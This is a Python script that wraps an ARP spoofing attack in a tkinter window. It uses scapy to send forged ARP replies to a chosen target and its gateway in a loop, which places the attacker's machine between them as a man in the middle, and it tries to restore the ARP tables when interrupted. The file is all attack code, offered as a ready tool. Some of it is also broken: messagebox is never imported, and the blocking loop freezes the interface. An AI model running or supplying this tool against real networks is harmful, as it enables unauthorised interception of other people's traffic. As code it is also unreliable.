import argparse
import time
import sys
from typing import Tuple
from scapy.all import ARP, Ether, srp, sendp
import tkinter as tk
from tkinter import scrolledtext

class ARP_SpoofingApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("ARP Spoofing")
        self.geometry("400x400")
        self.create_widgets()

    def create_widgets(self):
        self.label_target = tk.Label(self, text="Target IP:")
        self.label_target.pack(pady=5)
        
        self.entry_target = tk.Entry(self, width=30)
        self.entry_target.pack()

        self.label_gateway = tk.Label(self, text="Gateway IP:")
        self.label_gateway.pack(pady=5)
        
        self.entry_gateway = tk.Entry(self, width=30)
        self.entry_gateway.pack()

        self.scan_button = tk.Button(self, text="Start Spoofing", command=self.start_spoofing)
        self.scan_button.pack(pady=10)

        self.result_text = scrolledtext.ScrolledText(self, width=40, height=15)
        self.result_text.pack(pady=10)

    def get_arguments(self) -> Tuple[str, str]:
        target = self.entry_target.get()
        gateway = self.entry_gateway.get()
        if not all([target, gateway]):
            messagebox.showwarning("Warning", "Please enter both target and gateway IP addresses.")
            return None, None
        return target, gateway

    def get_mac(self, ip: str) -> str:
        arp_packet = ARP(pdst=ip)
        broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast_packet = broadcast_packet/arp_packet
        answered_list = srp(arp_broadcast_packet, timeout=1, verbose=False, iface=None)[0]
        return answered_list[0][1].hwsrc

    def restore(self, destination_ip: str, source_ip: str) -> None:
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        sendp(packet, verbose=False, count=4)

    def spoof(self, target_ip: str, spoof_ip: str) -> None:
        target_mac = self.get_mac(target_ip)
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        sendp(packet, verbose=False)

    def start_spoofing(self):
        target_ip, gateway_ip = self.get_arguments()
        if not target_ip or not gateway_ip:
            return

        self.result_text.delete('1.0', tk.END)
        sent_packets = 0
        try:
            while True:
                self.spoof(target_ip, gateway_ip)
                self.spoof(gateway_ip, target_ip)
                sent_packets += 2
                self.result_text.insert(tk.END, f"[+] Sent packets: {sent_packets}\n")
                self.result_text.see(tk.END)
                self.update_idletasks()
                time.sleep(2)

        except KeyboardInterrupt:
            self.result_text.insert(tk.END, "\n[-] Ctrl + C detected. Restoring ARP Tables Please Wait!\n")
            self.result_text.see(tk.END)
            self.update_idletasks()
            self.restore(target_ip, gateway_ip)
            self.restore(gateway_ip, target_ip)

if __name__ == "__main__":
    app = ARP_SpoofingApp()
    app.mainloop()
